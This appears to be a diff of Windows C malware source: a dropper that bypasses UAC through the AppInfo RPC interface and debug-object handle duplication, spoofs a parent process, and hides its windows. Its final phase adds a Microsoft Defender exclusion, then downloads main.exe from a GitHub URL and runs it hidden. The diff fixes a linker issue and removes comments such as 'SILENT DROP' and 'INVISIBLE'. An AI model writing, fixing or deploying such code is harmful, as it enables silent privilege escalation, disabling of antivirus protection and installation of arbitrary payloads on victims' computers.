@@ -9,8 +9,9 @@
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "shlwapi.lib")
 #pragma comment(lib, "urlmon.lib")
+#pragma comment(lib, "shell32.lib")   // <-- THIS FIXES ShellExecuteW
 
-// Hide console at start
+// Hide console
 #pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")
 
 #define APPINFO_RPC L"201ef99a-7fa0-444c-9399-19ba84f12a1a"
@@ -36,7 +37,7 @@ NTSTATUS NTAPI NtDuplicateObject(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, U
 VOID NTAPI DbgUiSetThreadDebugObject(HANDLE);
 NTSTATUS NTAPI NtClose(HANDLE);
 
-// RPC Structures
+// RPC Structures (unchanged)
 typedef struct _MONITOR_POINT { long MonitorLeft; long MonitorRight; } MONITOR_POINT;
 typedef struct _APP_STARTUP_INFO {
     wchar_t* lpszTitle; long dwX; long dwY; long dwXSize; long dwYSize;
@@ -99,7 +100,7 @@ NTSTATUS ucmxCreateProcessFromParent(HANDLE ParentProcess, LPWSTR Payload) {
     if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) return status;
     if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ParentProcess, sizeof(HANDLE), NULL, NULL)) return status;
     si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
-    si.StartupInfo.wShowWindow = SW_HIDE;        // INVISIBLE
+    si.StartupInfo.wShowWindow = SW_HIDE;
     si.StartupInfo.lpDesktop = (LPWSTR)T_DEFAULT_DESKTOP;
     if (CreateProcessW(NULL, Payload, NULL, NULL, FALSE, CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, g_ctx->szSystemRoot, (LPSTARTUPINFOW)&si, &pi)) {
         CloseHandle(pi.hThread);
@@ -126,7 +127,7 @@ BOOL DownloadAndRunPayload() {
     wcscat(exePath, L"main.exe");
 
     if (URLDownloadToFileW(NULL, L"https://github.com/dreamyfx/isyncnotif/raw/refs/heads/main/main.exe", exePath, 0, NULL) == S_OK) {
-        ShellExecuteW(NULL, L"open", exePath, NULL, NULL, SW_HIDE);   // INVISIBLE
+        ShellExecuteW(NULL, L"open", exePath, NULL, NULL, SW_HIDE);
         return TRUE;
     }
     return FALSE;
@@ -142,7 +143,6 @@ int main() {
     GetSystemDirectoryW(g_ctx->szSystemDirectory, MAX_PATH);
     GetWindowsDirectoryW(g_ctx->szSystemRoot, MAX_PATH);
 
-    // PHASE 1
     wcscpy(szProcess, g_ctx->szSystemDirectory); wcscat(szProcess, WINVER_EXE);
     if (!AicLaunchAdminProcess(szProcess, szProcess, 0, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, g_ctx->szSystemRoot, T_DEFAULT_DESKTOP, NULL, INFINITE, SW_HIDE, &procInfo)) return 1;
 
@@ -153,7 +153,6 @@ int main() {
     TerminateProcess((HANDLE)procInfo.ProcessHandle, 0);
     CloseHandle((HANDLE)procInfo.ThreadHandle); CloseHandle((HANDLE)procInfo.ProcessHandle);
 
-    // PHASE 2
     wcscpy(szProcess, g_ctx->szSystemDirectory); wcscat(szProcess, COMPUTERDEFAULTS_EXE);
     if (!AicLaunchAdminProcess(szProcess, szProcess, 1, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, g_ctx->szSystemRoot, T_DEFAULT_DESKTOP, NULL, INFINITE, SW_HIDE, &procInfo)) return 1;
 
@@ -176,11 +175,9 @@ int main() {
         ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
     }
 
-    // PHASE 3 - SILENT DROP
     AddDefenderExclusion();
     DownloadAndRunPayload();
 
-    // Clean exit
     DebugActiveProcessStop(procInfo.ProcessId);
     DbgUiSetThreadDebugObject(NULL);
     if (dbgHandle) NtClose(dbgHandle);
